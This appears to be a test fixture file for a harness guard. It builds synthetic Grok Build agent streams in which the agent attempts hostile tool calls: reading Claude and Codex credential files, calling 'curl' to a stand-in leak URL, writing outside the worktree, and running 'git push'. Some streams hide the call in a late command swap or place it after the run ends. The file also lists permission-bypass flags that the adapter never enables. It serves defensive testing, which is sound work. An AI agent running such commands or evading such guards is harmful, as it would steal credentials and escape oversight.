/**
 * Grok Build case file for the per-adapter malicious leg (T4.26, T4.3; NFR-SEC-03, FR-POL-04, FR-POL-06). Streams are
 * SYNTHETIC, in the `streaming-json` line types of the 2026-10-14 live check
 * (`docs/research/live-checks-2026-10-14-grok.md` rows 4b, 7a, 8c, 8f; CLI version 1.0.50) and of the adapter's
 * synthetic fixtures (`src/adapters/grok/fixtures/task_failure.jsonl`). They are not recordings of a real Grok Build run.
 *
 * Compiles the one scope family Grok Build supports: an approved privileged bypass scope with repository configuration
 * `enabled` (T4.22, owner decisions 26 and 46). The leg's main profile is `--sandbox strict` (network off); the other
 * two compiled cells (`workspace` with network on, `read-only` files) are checked through `extraProfiles`. Repository
 * configuration `approved` is refused. FR-POL-04 is therefore not shown for Grok Build: in the compiled scope project
 * sources load; what this case proves is that no flag widens that (no `--trust`, no `--permission-mode`).
 *
 * Tool-call guard (T4.26, ADR-0039): in an approved bypass run Switchboard's own tool-call guard enforces Git-write
 * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25).
 * Covered matrix shapes:
 * - standard denial (`tool_call` followed by sandbox rejection or denied update);
 * - cancelled runs (row 8f's `cancelled` `stopReason` and failed update status);
 * - trailing tool calls after the `end` line in `tool_call` and `tool_call_update` forms (T4.23 fail-closed);
 * - late and swapped commands in `tool_call_update`;
 * - runs with no `end` line at exit 0 and exit 1;
 * - hostile calls followed by provider `error` lines (model unavailable, auth, rate limit) across all categories at exit 0 and exit 1;
 * - stream anomalies (session id changed mid-run, multiple `end` lines, unknown events before the hostile call,
 *   unsafe session IDs, structured model and backing-provider fields, own `__proto__` key beside command) at exit 0 and exit 1;
 * - varied Git write syntax (`git commit -am`, `git -C . push --force`, `git update-ref`, `git branch -D`, and the
 *   forms live check step 9 showed a prefix deny does not stop: `git -C . commit`, `/usr/bin/git commit`,
 *   `sh -c 'git ...'`, plus `env git push`, `xargs git push`, `git --git-dir=.git commit`, `git reset --hard`,
 *   `git merge`, `git rebase`, `git pull`, `git cherry-pick`, `git checkout -b`, and `git revert`);
 * - alternative argument keys (`parameters`, `args`, `arguments`, `command`, `cmd`, `CommandLine`), including
 *   `input.cmd`, `parameters.CommandLine`, `args.CommandLine`, `arguments.cmd`, top-level `command`, and omitted
 *   tool name defaulting to `run_terminal_command`, on `tool_call` and `tool_call_update`, and shell identity via `name` and
 *   `tool_name`;
 * - a hostile command that arrives only on `tool_call_update`, and a swap correlated by `id`, `call_id` or
 *   `tool_call_id`;
 * - parser fall-through (a non-object `input`, a null `parameters`, a non-string `command` beside `cmd`, a path beside
 *   a command), a non-shell or empty tool name and an empty id carrying a command, a benign call before a separate
 *   hostile one, a hostile call swapped back to a benign command, and exit codes 2 and 137;
 * - a hostile call before `end` followed, after `end`, by an unreadable or a repeated `tool_call_update` (which the
 *   parser does not count as a call after `end`), at exit 0 and exit 1;
 * - JSON encodings the parser sees only after `JSON.parse` (`\u` escapes in type, key and command, a duplicate
 *   command key whose last value is the Git write, CRLF line endings), hypothetical `stopReason` values `max_tokens`
 *   and `refusal`, a path-only call given a command on the same id, and swapped-in-update and after-`end` calls at
 *   exit 2 and 137;
 * - the parser branches the T4.23 second pass pinned (an empty object `input` beside a top-level command, an id-less
 *   update after an id'd call, an empty `error` message, an empty `stopReason`, a target-only shell call given a
 *   command), at exit 0 and exit 1;
 * - the parser branches the T4.23 third pass pinned (an unrecognised `end` before a valid `end`, a failed first `end`
 *   followed by `end_turn`, a second `end` with a changed session id, text after `end`, an unsafe session id, and an
 *   error line before `end`), at exit 0 and exit 1;
 * - the parser branches the T4.23 fourth to sixth passes pinned (an unsafe first `end` then a second `end`, a decoy
 *   `sessionId` on the call, a 5,000-character command, a caller id equal to the generated `call_1`, a `null` or
 *   number `input` beside `parameters`, a short command carried only as a target, an empty `id` beside `call_id`, a
 *   duplicate `type` key, an empty text chunk), at exit 0 and exit 1;
 * - the target-only shell gap closed on 2026-10-15 (a Git write past the 512-character target clip, and a nameless
 *   target-only update on a shell call), at exit 0 and exit 1;
 * - prototype-named, near-miss, non-string, unreadable text/end/update, non-object-input, empty-name, live-bare,
 *   shadowed-parameter, unrecognised-end, case-variant and duplicate-`type` tool lines in `unknown_events`, at exits
 *   0, 1, 2 and 137.
 *
 * Field names other than `type` are still hypothetical: the live check did not record command or target fields.
 * Residual blocked streams are exported as `grokResidualStreams`; partial streams cut inside a line (covering exits
 * 0, 1, 2 and 137) are exported as `grokPartialStreams` and replayed separately; the compiled cells and the scopes
 * Grok Build must refuse are exported as `grokCompiledCells` and `grokRefusedScopes`.
 */

import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
import { replayLauncher } from "../../../src/adapters/fixtures/replay.js";
import { GrokAdapter } from "../../../src/adapters/grok/adapter.js";
import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/grok/fixtures/cases.js";
import type { Ineligible, Invocation, ResolvedProfile } from "../../../src/adapters/index.js";
import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";
import type { MaliciousFixture } from "../fixture.js";

const SID = "00000000-0000-4000-8000-0000000000aa";
const OTHER_SID = "00000000-0000-4000-8000-0000000000bb";

const META = (what: string, exit = 0) =>
  JSON.stringify({
    _fixture: {
      synthetic: true,
      note: `SYNTHETIC: hand-written for the Grok Build malicious leg (T4.26); no secrets. ${what}`,
      exit,
    },
  });

const TOOLS = JSON.stringify({ type: "available_commands", tools: ["run_terminal_command"] });

/** Hypothetical fields: only the `type` values were recorded (live check row 4b). */
const toolCall = (command: string) =>
  JSON.stringify({ type: "tool_call", tool: "run_terminal_command", input: { command } });

/** Row 7a: the sandbox refused the write; the shell tool result was `exit: 1` with `Permission denied`. */
const sandboxDenied = (command: string) =>
  JSON.stringify({
    type: "tool_call_update",
    status: "completed",
    content: `exit: 1\n${command.split(" ")[0]}: Permission denied`,
  });

/** Row 8f: cancelled execution status in tool_call_update. */
const cancelledUpdate = (command: string) =>
  JSON.stringify({
    type: "tool_call_update",
    status: "failed",
    content: `User cancelled the execution for tool run_terminal_command (${command.split(" ")[0]})`,
  });

const text = (data: string) => JSON.stringify({ type: "text", data });

/** Rows 4b, 7a, 8c: the run still ends `end_turn` at exit 0. */
const end = (stopReason = "end_turn", sessionId = SID) =>
  JSON.stringify({
    type: "end",
    stopReason,
    sessionId,
    requestId: "req_synthetic_malicious",
    usage: { input_tokens: 1, output_tokens: 1, total_tokens: 2 },
    num_turns: 1,
  });

const shellDenied = (command: string) => [TOOLS, toolCall(command), sandboxDenied(command), text("Not done."), end()];

/** Provider error lines (EVENT.error in protocol.ts). */
const MODEL_ERROR = JSON.stringify({
  type: "error",
  message: "Couldn't set model 'grok-synthetic'",
});

const AUTH_ERROR = JSON.stringify({
  type: "error",
  message: "Not signed in. Run grok login.",
});

const RATE_LIMIT_ERROR = JSON.stringify({
  type: "error",
  message: "Rate limit exceeded (synthetic)",
});

const grokCase: AdapterLegCase = {
  provider: "grok",
  profile: PRIVILEGED_BYPASS_PROFILE,
  bypassApproved: true,
  nonDisabledRepoConfig: privilegedProfile({ ...BYPASS_SCOPE, repository_config: { mode: "approved" } }),
  // `--no-auto-update` keeps the binary fixed during the run (ADR-0009); `--output-format streaming-json` is the parsed
  // surface; `--sandbox strict` and `--disable-web-search` are the scope's file and network containment (T4.22).
  isolationFlags: [
    "--no-auto-update",
    "--output-format",
    "streaming-json",
    "--sandbox",
    "strict",
    "--disable-web-search",
  ],
  extraProfiles: [
    {
      label: "workspace (network on)",
      profile: privilegedProfile({ ...BYPASS_SCOPE, network: { mode: "on" } }),
      isolationFlags: ["--no-auto-update", "--output-format", "streaming-json", "--sandbox", "workspace"],
    },
    {
      label: "read-only files",
      profile: privilegedProfile({ ...BYPASS_SCOPE, files: { access: "read-only" } }),
      isolationFlags: [
        "--no-auto-update",
        "--output-format",
        "streaming-json",
        "--sandbox",
        "read-only",
        "--disable-web-search",
      ],
    },
  ],
  // Never emitted by the adapter (src/adapters/grok/adapter.ts header; FR-POL-03, ADR-0017): `--trust` writes the
  // global trusted-folders file and enables project sources, `-w`/`--worktree` and `--fork-session` leave the run's
  // checkout or session, `--permission-mode` and `--allow` widen what the sandbox run may do, `-m`/`--model` is not
  // compiled (T4.5); plus the bypass flags other than the one `--always-approve` the approved scope compiles.
  neverEnabledFlags: [
    "--trust",
    "-w",
    "--worktree",
    "--fork-session",
    "--permission-mode",
    "--allow",
    "-m",
    "--model",
    "--dangerously-skip-permissions",
    "--yolo",
    "--force",
    "--approve-mcps",
    "--full-auto",
  ],
  makeAdapter: (file, exitCode) =>
    new GrokAdapter({
      executable: process.execPath,
      launcherArgs: replayLauncher("grok", file, ["--exit-code", String(exitCode)]),
      timeouts: { wallClockMs: 10_000, idleMs: 2_000, killGraceMs: 300 },
    }),
  streams: (fx) => [
    // -------------------------------------------------------------------------
    // 1. Basic denial shapes across exit 0 and exit 1
    // -------------------------------------------------------------------------
    {
      name: "shell read of a credential path",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path", 0),
        ...shellDenied(`cat ${fx.claudeCredentialsPath} && git push origin main`),
      ],
    },
    {
      name: "shell read of a credential path, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        sandboxDenied(`cat ${fx.codexAuthPath} && git push origin main`),
      ],
    },
    {
      name: "shell write outside the worktree (row 7a shape)",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree", 0),
        ...shellDenied(`touch ${fx.outsideSentinel} && git push origin main`),
      ],
    },
    {
      name: "shell write outside the worktree, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        sandboxDenied(`touch ${fx.outsideSentinel} && git push origin main`),
      ],
    },
    {
      name: "shell network call",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call", 0),
        ...shellDenied(`curl https://example.invalid/leak && git push origin main`),
      ],
    },
    {
      name: "shell network call, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, exit 1", 1),
        TOOLS,
        toolCall(`curl https://example.invalid/leak && git push origin main`),
        sandboxDenied(`curl https://example.invalid/leak && git push origin main`),
      ],
    },

    // -------------------------------------------------------------------------
    // 2. Cancelled run shapes (row 8f shape) at exit 0 and exit 1
    // -------------------------------------------------------------------------
    {
      name: "shell read of a credential path, cancelled (row 8f shape)",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, cancelled", 0),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        cancelledUpdate(`cat ${fx.codexAuthPath} && git push origin main`),
        end("cancelled"),
      ],
    },
    {
      name: "shell read of a credential path, cancelled, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, cancelled, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        cancelledUpdate(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        end("cancelled"),
      ],
    },
    {
      name: "shell write outside the worktree, cancelled",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, cancelled", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        cancelledUpdate(`touch ${fx.outsideSentinel} && git push origin main`),
        end("cancelled"),
      ],
    },
    {
      name: "shell write outside the worktree, cancelled, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, cancelled, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        cancelledUpdate(`touch ${fx.outsideSentinel} && git push origin main`),
        end("cancelled"),
      ],
    },
    {
      name: "shell network call, cancelled",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, cancelled", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        cancelledUpdate("curl https://example.invalid/leak && git push origin main"),
        end("cancelled"),
      ],
    },
    {
      name: "shell network call, cancelled, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, cancelled, exit 1", 1),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        cancelledUpdate("curl https://example.invalid/leak && git push origin main"),
        end("cancelled"),
      ],
    },

    // -------------------------------------------------------------------------
    // 3. Trailing tool call after the `end` line at exit 0 and exit 1
    // -------------------------------------------------------------------------
    {
      name: "shell read of a credential path after the end line",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path after the end line", 0),
        TOOLS,
        text("Done."),
        end(),
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        JSON.stringify({ type: "tool_call_update" }),
      ],
    },
    {
      name: "shell read of a credential path after the end line, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path after the end line, exit 1", 1),
        TOOLS,
        end(),
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
      ],
    },
    {
      name: "shell write outside the worktree after the end line",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree after the end line", 0),
        TOOLS,
        text("Done."),
        end(),
        JSON.stringify({ type: "tool_call", command: `touch ${fx.outsideSentinel} && git push origin main` }),
      ],
    },
    {
      name: "shell write outside the worktree after the end line, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree after the end line, exit 1", 1),
        TOOLS,
        end(),
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
      ],
    },
    {
      name: "shell network call after the end line",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call after the end line", 0),
        TOOLS,
        text("Done."),
        end(),
        toolCall("curl https://example.invalid/leak && git push origin main"),
      ],
    },
    {
      name: "shell network call after the end line, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call after the end line, exit 1", 1),
        TOOLS,
        end(),
        toolCall("curl https://example.invalid/leak && git push origin main"),
      ],
    },

    // -------------------------------------------------------------------------
    // 4. Trailing tool call after a cancelled `end` line at exit 0 and exit 1
    // -------------------------------------------------------------------------
    {
      name: "shell read of a credential path after a cancelled end line",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path after a cancelled end line", 0),
        TOOLS,
        end("cancelled"),
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
      ],
    },
    {
      name: "shell read of a credential path after a cancelled end line, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path after a cancelled end line, exit 1", 1),
        TOOLS,
        end("cancelled"),
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
      ],
    },
    {
      name: "shell write outside the worktree after a cancelled end line",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree after a cancelled end line", 0),
        TOOLS,
        end("cancelled"),
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
      ],
    },
    {
      name: "shell write outside the worktree after a cancelled end line, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree after a cancelled end line, exit 1", 1),
        TOOLS,
        end("cancelled"),
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
      ],
    },
    {
      name: "shell network call after a cancelled end line",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call after a cancelled end line", 0),
        TOOLS,
        end("cancelled"),
        toolCall("curl https://example.invalid/leak && git push origin main"),
      ],
    },
    {
      name: "shell network call after a cancelled end line, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call after a cancelled end line, exit 1", 1),
        TOOLS,
        end("cancelled"),
        toolCall("curl https://example.invalid/leak && git push origin main"),
      ],
    },

    // -------------------------------------------------------------------------
    // 5. Tool call updates: command provided in update (started without command)
    // -------------------------------------------------------------------------
    {
      name: "completed shell read of a credential path with command in tool_call_update",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell read of a credential path with command in tool_call_update", 0),
        TOOLS,
        JSON.stringify({ type: "tool_call", tool: "run_terminal_command" }),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `cat ${fx.claudeCredentialsPath} && git push origin main` },
        }),
        text("Done."),
        end(),
      ],
    },
    {
      name: "completed shell read of a credential path with command in tool_call_update, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell read of a credential path with command in tool_call_update, exit 1", 1),
        TOOLS,
        JSON.stringify({ type: "tool_call", tool: "run_terminal_command" }),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `cat ${fx.codexAuthPath} && git push origin main` },
        }),
      ],
    },
    {
      name: "completed shell write outside the worktree with command in tool_call_update",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell write outside the worktree with command in tool_call_update", 0),
        TOOLS,
        JSON.stringify({ type: "tool_call", tool: "run_terminal_command" }),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `touch ${fx.outsideSentinel} && git push origin main` },
        }),
        text("Done."),
        end(),
      ],
    },
    {
      name: "completed shell write outside the worktree with command in tool_call_update, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell write outside the worktree with command in tool_call_update, exit 1", 1),
        TOOLS,
        JSON.stringify({ type: "tool_call", tool: "run_terminal_command" }),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `touch ${fx.outsideSentinel} && git push origin main` },
        }),
      ],
    },
    {
      name: "completed shell network call with command in tool_call_update",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell network call with command in tool_call_update", 0),
        TOOLS,
        JSON.stringify({ type: "tool_call", tool: "run_terminal_command" }),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
        text("Done."),
        end(),
      ],
    },
    {
      name: "completed shell network call with command in tool_call_update, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell network call with command in tool_call_update, exit 1", 1),
        TOOLS,
        JSON.stringify({ type: "tool_call", tool: "run_terminal_command" }),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
      ],
    },

    // -------------------------------------------------------------------------
    // 6. Tool call updates: command swapped in update (started with benign command)
    // -------------------------------------------------------------------------
    {
      name: "shell read of a credential path swapped in tool_call_update",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path swapped in tool_call_update", 0),
        TOOLS,
        toolCall("echo benign"),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `cat ${fx.claudeCredentialsPath} && git push origin main` },
        }),
        end(),
      ],
    },
    {
      name: "shell read of a credential path swapped in tool_call_update, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path swapped in tool_call_update, exit 1", 1),
        TOOLS,
        toolCall("echo benign"),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `cat ${fx.codexAuthPath} && git push origin main` },
        }),
      ],
    },
    {
      name: "shell write outside the worktree swapped in tool_call_update",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree swapped in tool_call_update", 0),
        TOOLS,
        toolCall("ls"),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `touch ${fx.outsideSentinel} && git push origin main` },
        }),
        end(),
      ],
    },
    {
      name: "shell write outside the worktree swapped in tool_call_update, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree swapped in tool_call_update, exit 1", 1),
        TOOLS,
        toolCall("ls"),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `touch ${fx.outsideSentinel} && git push origin main` },
        }),
      ],
    },
    {
      name: "shell network call swapped in tool_call_update",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call swapped in tool_call_update", 0),
        TOOLS,
        toolCall("uname -a"),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
        end(),
      ],
    },
    {
      name: "shell network call swapped in tool_call_update, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call swapped in tool_call_update, exit 1", 1),
        TOOLS,
        toolCall("uname -a"),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
      ],
    },

    // -------------------------------------------------------------------------
    // 7. Trailing tool_call_update with command after the `end` line
    // -------------------------------------------------------------------------
    {
      name: "shell read of a credential path in tool_call_update after the end line",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path in tool_call_update after the end line", 0),
        TOOLS,
        text("Done."),
        end(),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `cat ${fx.claudeCredentialsPath} && git push origin main` },
        }),
      ],
    },
    {
      name: "shell read of a credential path in tool_call_update after the end line, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path in tool_call_update after the end line, exit 1", 1),
        TOOLS,
        end(),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `cat ${fx.codexAuthPath} && git push origin main` },
        }),
      ],
    },
    {
      name: "shell write outside the worktree in tool_call_update after the end line",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree in tool_call_update after the end line", 0),
        TOOLS,
        text("Done."),
        end(),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `touch ${fx.outsideSentinel} && git push origin main` },
        }),
      ],
    },
    {
      name: "shell write outside the worktree in tool_call_update after the end line, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree in tool_call_update after the end line, exit 1", 1),
        TOOLS,
        end(),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: `touch ${fx.outsideSentinel} && git push origin main` },
        }),
      ],
    },
    {
      name: "shell network call in tool_call_update after the end line",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call in tool_call_update after the end line", 0),
        TOOLS,
        text("Done."),
        end(),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
      ],
    },
    {
      name: "shell network call in tool_call_update after the end line, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call in tool_call_update after the end line, exit 1", 1),
        TOOLS,
        end(),
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
      ],
    },

    // -------------------------------------------------------------------------
    // 8. Runs that terminate without an `end` line at exit 0 and exit 1 (fail closed)
    // -------------------------------------------------------------------------
    {
      name: "completed shell read of a credential path with no end line",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell read of a credential path with no end line", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        sandboxDenied(`cat ${fx.claudeCredentialsPath} && git push origin main`),
      ],
    },
    {
      name: "completed shell read of a credential path with no end line, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell read of a credential path with no end line, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        sandboxDenied(`cat ${fx.codexAuthPath} && git push origin main`),
      ],
    },
    {
      name: "completed shell write outside the worktree with no end line",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell write outside the worktree with no end line", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        sandboxDenied(`touch ${fx.outsideSentinel} && git push origin main`),
      ],
    },
    {
      name: "completed shell write outside the worktree with no end line, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell write outside the worktree with no end line, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        sandboxDenied(`touch ${fx.outsideSentinel} && git push origin main`),
      ],
    },
    {
      name: "completed shell network call with no end line",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell network call with no end line", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        sandboxDenied("curl https://example.invalid/leak && git push origin main"),
      ],
    },
    {
      name: "completed shell network call with no end line, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("completed shell network call with no end line, exit 1", 1),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        sandboxDenied("curl https://example.invalid/leak && git push origin main"),
      ],
    },

    // -------------------------------------------------------------------------
    // 9. Hostile call followed by a provider `error` line (guard outranks provider error)
    // -------------------------------------------------------------------------
    {
      name: "shell read of a credential path, then a provider model error",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then a provider model error", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        MODEL_ERROR,
        end(),
      ],
    },
    {
      name: "shell read of a credential path, then a provider model error, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then a provider model error, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        MODEL_ERROR,
      ],
    },
    {
      name: "shell read of a credential path, then a provider auth error",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then a provider auth error", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        AUTH_ERROR,
        end(),
      ],
    },
    {
      name: "shell read of a credential path, then a provider auth error, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then a provider auth error, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        AUTH_ERROR,
      ],
    },
    {
      name: "shell read of a credential path, then a provider rate limit error",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then a provider rate limit error", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        RATE_LIMIT_ERROR,
        end(),
      ],
    },
    {
      name: "shell read of a credential path, then a provider rate limit error, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then a provider rate limit error, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        RATE_LIMIT_ERROR,
      ],
    },
    {
      name: "shell write outside the worktree, then a provider model error",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, then a provider model error", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        MODEL_ERROR,
        end(),
      ],
    },
    {
      name: "shell write outside the worktree, then a provider model error, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, then a provider model error, exit 1", 1),
